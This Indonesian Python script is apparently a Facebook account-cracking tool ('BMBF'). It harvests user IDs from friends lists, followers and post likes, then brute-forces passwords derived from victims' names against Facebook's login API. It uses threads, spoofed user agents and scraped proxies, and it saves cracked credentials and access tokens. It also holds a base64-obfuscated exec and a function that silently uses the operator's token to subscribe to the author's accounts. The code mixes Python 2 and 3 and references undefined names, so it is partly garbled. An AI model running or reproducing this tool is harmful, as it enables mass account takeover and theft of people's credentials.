# [+] Update By BrayennnXD And All
# [+] Script Free Jangan Di Perjual Belikan Ya
# [+] Donasi Untuk BrayennnXD 
# [+] Dana : 089622155832
# [+] Thanks Buat Yang Dah Bantu Donasi 😁

#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 4A Build/MMB29M; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 hola_android'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1"
    UaMainn = random.choice([u1, u2, u3])
    ugen.append(UaMainn)

for memekx in range(200):
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	liu.append(api)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
IP = requests.get("https://api.ipify.org/").text
def banner():
	print (''' %s 
 © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sRomi Afrizal \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
 (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
 
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] Isi yang benar kentod "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] Wajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(P,K))
        if romz in(""):
        	print("%s [!] Isi yang benar kentod "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_bot(romz)
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAG %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
    
# JANGAN DI UBAH BOLEH NAMBAH COEG !
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100067807565861')
		romz2 = ('100029143111567')
		romz3 = ('100028434880529')
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # ROMI AFRIZAL PENGGUNA AKUN UNIK
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT ROMI AFRIZAL
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # Romi Afrizal (2018)
		
	except:
		pass
		
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
        
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] Target id : %s'%(K))
        batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(%s)&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['subscribers']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
        
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
        idt = raw_input(' [*] Id post   : %s'%(K))
        simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s?fields=name,likes.fields(id,name).limit(999999)&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['likes']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,H,P))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id'%(P))
        
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] file dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(P,K))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
            print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
            
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
